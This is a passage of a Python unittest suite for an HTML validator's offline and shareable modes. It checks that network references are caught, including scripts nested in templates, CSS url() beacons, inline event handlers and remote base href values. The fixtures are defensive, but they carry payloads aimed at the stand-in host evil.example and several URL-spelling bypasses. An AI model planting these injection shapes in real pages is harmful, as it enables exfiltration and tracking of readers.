                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nested))))
                self.assertTrue(any(needle in e for e in errors), ("nested", inner, errors))

    def test_offline_egress_check_sees_a_script_nested_in_a_template_parked_script(self):
        # CMH-VAL-21: inside a template a `<svg><script>` holds MARKUP too, so a SECOND script
        # nested in an inert one is a real element the exporter's recursive walk carries - with
        # its OWN attributes. While the parked capture was one scalar opened only when empty,
        # only the outer `text/plain` record reached `template_scripts` and the inner
        # EXECUTABLE script's import was skipped, recreating the validator/exporter mismatch the
        # template scan exists to close.
        block = ('<template id="parked"><svg><script type="text/plain">'
                 '<script type="text/javascript">import("https://evil.example/x.js");</script>'
                 "</script></svg></template>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertTrue(any("imports a network module" in e for e in errors), errors)

    def test_offline_check_sees_a_style_nested_in_a_template_parked_style(self):
        block = ('<template id="parked-css"><svg><style>'
                 "<style>.x { background-image: url(https://evil.example/bg.png); }</style>"
                 "</style></svg></template>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertTrue(any("offline mode" in e and "url(" in e for e in errors), errors)

    def test_offline_check_sees_template_parked_network_css(self):
        block = ('<template id="parked-css">\n'
                 "<style>.x { background-image: url(https://evil.example/bg.png); }</style>\n"
                 '<p style="background: url(//evil.example/inline.png)">x</p>\n'
                 "</template>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        for needle in ("style block", "inline style"):
            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
                            (needle, errors))

    # The control: a template holding only local content is legitimate and must stay clean.
    def test_offline_check_accepts_a_local_template(self):
        block = ('<template id="ok">\n'
                 '<style>.x { color: #123456; }</style>\n'
                 '<script type="text/javascript">window.__ok = 1;</script>\n'
                 '<script type="importmap">{"imports": {"lib": "./lib.js"}}</script>\n'
                 '<img src="data:image/png;base64,AAAA" alt="x">\n'
                 "</template>")
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # The exporter removes every `on*` attribute; a gate that did not look would certify a
    # hand-authored offline file the export would have changed - and an inline handler is exactly
    # the channel the offline CSP cannot close.
    def test_offline_mode_rejects_inline_event_handlers(self):
        for block in ('<button id="go" onclick="location.href=\'https://evil.example/x\'">go</button>',
                      '<img id="pixel" alt="x" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" '
                      'onload="location.href=\'https://evil.example/x\'">',
                      '<template id="parked-handler"><button onclick="alert(1)">go</button></template>'):
            with self.subTest(block=block):
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("the export scrubs it" in e for e in errors), (block, errors))

    def test_offline_mode_rejects_an_on_prefixed_attribute_that_is_not_a_handler(self):
        # The gate's test is the exporter's literal `^on`, which also takes `once` and `onward` -
        # the exporter really does `removeAttribute("once")`, so a validator that were cleverer
        # than the strip would bless an attribute the export removes. The message must then claim
        # only what the predicate decides, not assert that the attribute runs code.
        block = '<div id="probe" once="1" onward="x">text</div>'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        for attr in ("once", "onward"):
            # The FORMATTED head, which names one attribute, rather than a phrase the static
            # message text carries anyway - otherwise both iterations assert the same thing and a
            # drift that flagged only one of the two would stay green.
            self.assertTrue(any('<div %s="...">' % attr in e for e in errors), (attr, errors))

    def test_offline_mode_rejects_an_event_handler_only_a_dom_walk_reaches(self):
        # The exporter scrubs `on*` off every element `querySelectorAll("*")` reaches on a
        # DOMParser document, where scripting is OFF - so it reaches a self-closed FOREIGN
        # element and the markup inside a `<noscript>`. The gate read the document parser's
        # start-tag scan instead, which RETURNS before that scan for a self-closed foreign
        # element and sees a `<noscript>` body as raw TEXT, so both shapes rode into a file
        # `--strict` then certified as offline-clean.
        for block in ('<svg viewBox="0 0 1 1"><rect width="1" height="1" '
                      'onload="location.href=\'https://evil.example/x\'"/></svg>',
                      '<noscript><button onclick="location.href=\'https://evil.example/x\'">'
                      "go</button></noscript>",
                      '<template id="parked-svg"><svg><rect onload="alert(1)"/></svg></template>'):
            with self.subTest(block=block):
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("the export scrubs it" in e for e in errors), (block, errors))

    def test_offline_mode_accepts_a_document_without_event_handlers(self):
        block = ('<button id="go" data-onclick="not a handler">go</button>'
                 '<svg viewBox="0 0 1 1"><rect width="1" height="1" fill="#123456"/></svg>'
                 '<noscript><p data-only="text">enable scripting</p></noscript>')
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # A <base href> loads nothing itself, so neither this gate nor the export strip looked at one -
    # and both treat a RELATIVE reference as safe, which is the whole control case. A base element
    # REBASES every relative reference in the document onto the base it names, so the very relative
    # image or script reference both sides read as local fetches off-host instead. The exporter
    # clears the same attribute, so the gate has to see it too or the two disagree (#924).
    #
    # The spellings matter here in a way they do not for a single resource: a base is held to the
    # stricter `offline_is_non_local_ref` rather than the `//`-requiring network predicate, because
    # a browser resolves `https:evil.example/` and `https:/\evil.example/` to a remote host too and
    # for a base that would defeat the whole check (a #923 residual the CSP absorbs for one
    # attribute is a document-wide rebase here).
    def test_offline_mode_rejects_a_base_href_that_points_at_the_network(self):
        beacon = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="beacon.png" alt="x">')
        # The pairing this row exists for: the relative reference alone is NOT an error.
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(beacon))))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("local path" in w for w in warnings), warnings)
        cases = (
            '<base href="https://evil.example/">',
            '<base href="//evil.example/">',
            # A browser strips leading C0 controls and spaces before it parses a URL.
            '<base href=" \thttps://evil.example/">',
            # Slash-less and backslash spellings a WHATWG URL parser still resolves to a host.
            '<base href="https:evil.example/">',
            '<base href="https:/evil.example/">',
            '<base href="https:/\\evil.example/">',
            # An SMB/UNC authority leaks credentials from a file:// document.
            '<base href="file://evil.example/share/">',
            '<base href="\\\\evil.example\\share\\">',
            # A scheme the file cannot resolve on its own is non-local however it is spelled.
            '<base href="blob:https://evil.example/x">',
            # A template-parked base is inert until a script adopts the fragment and inserts it,
            # which is when it starts rebasing - the same reason the other offline checks walk in.
            '<template id="parked-base"><base href="https://evil.example/"></template>',
        )
        for base in cases:
            with self.subTest(base=base):
                doc = with_offline_mode(build(body=self._body(beacon, base)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "<base href" in e for e in errors),
                                (base, errors))

    # The self-contained guarantee is not offline-only, and unlike offline a shareable file has no
    # zero-network CSP behind it - so a shareable document that rebases its relative references onto
    # a remote host is an error there too.
    def test_shareable_mode_rejects_a_base_href_that_points_at_the_network(self):
        for base in ('<base href="https://evil.example/">', '<base href="https:evil.example/">'):
            with self.subTest(base=base):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, base)))
                self.assertTrue(any("self-contained guarantee" in e and "<base href" in e
                                    for e in errors), (base, errors))

    # The control: a relative base still resolves inside the file's own directory, so it reaches no
    # network and must be left alone - removing it would break an author's local reference set.
    def test_offline_mode_accepts_a_relative_base_href(self):
        for base in ('<base href="assets/">', '<base href="./assets/">', '<base href="/assets/">',
                     '<base href="">', '<base target="_blank">'):
            with self.subTest(base=base):
                doc = with_offline_mode(build(body=self._body(MAIN, base)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], (base, errors))
                self.assertEqual(warnings, [], (base, warnings))


    def test_external_stylesheet_link_warns(self):
        link = '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=X">'
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, link)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("self-contained guarantee" in w for w in warnings), warnings)

    # -- duplicate heading ids --------------------------------------------- #
    def test_duplicate_heading_ids_warn(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <h2 id="dup">A</h2>\n  <p>x</p>\n  <h2 id="dup">B</h2>\n</main>')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("duplicate heading id" in w for w in warnings), warnings)

    # -- embeddedComments per-item schema ---------------------------------- #
    def _embedded(self, payload):
        return ("<!--\nBEGIN: commentable-html - EMBEDDED COMMENTS\n-->\n"
                '<script type="application/json" id="embeddedComments">' + payload + "</script>\n"
                "<!-- END: commentable-html - EMBEDDED COMMENTS -->")

    def test_embedded_comment_item_bad_id_errors(self):
        body = [HANDLED_REGION, self._embedded('[{"id": null, "note": "x"}]'), comment_ui(), MAIN, JS_REGION]
        errors, _ = self._errs_warns(build(body=body))
        self.assertTrue(any("missing or unsafe id" in e for e in errors), errors)

    def test_embedded_comment_item_valid_id_is_clean(self):
        body = [HANDLED_REGION, self._embedded('[{"id": "cabc123", "note": "hi"}]'), comment_ui(), MAIN, JS_REGION]
        errors, warnings = self._errs_warns(build(body=body))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # -- canvas aria: report ALL offenders in one pass --------------------- #
    def test_multiple_canvases_missing_aria_reported_together(self):
        main = ('<main id="commentRoot" data-cmh-content-root data-comment-key="k" data-doc-label="l" data-doc-source="s">\n'
                '  <div class="cm-skip"><canvas id="c1"></canvas></div>\n'
                '  <div class="cm-skip"><canvas id="c2"></canvas></div>\n</main>')
        render = '<script>var x = document.getElementById("c1").getContext("2d");</script>'
        errors, warnings = self._errs_warns(build(body=self._body(main, render)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("2 of 2 <canvas>" in w for w in warnings), warnings)

    # -- --strict CLI ------------------------------------------------------- #
    def test_strict_flag_fails_on_warnings_only(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        content = build(body=self._body(main))
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "doc.html")
            with open(p, "w", encoding="utf-8", newline="") as fh:
                fh.write(content)
            r_plain = subprocess.run([sys.executable, VALIDATE_PY, p], capture_output=True, text=True)
            self.assertEqual(r_plain.returncode, 0, r_plain.stdout + r_plain.stderr)
            self.assertIn("WARNING", r_plain.stdout)
            r_strict = subprocess.run([sys.executable, VALIDATE_PY, "--strict", p], capture_output=True, text=True)
            self.assertEqual(r_strict.returncode, 1, r_strict.stdout + r_strict.stderr)
            self.assertIn("strict", r_strict.stdout.lower())


if __name__ == "__main__":
    unittest.main()
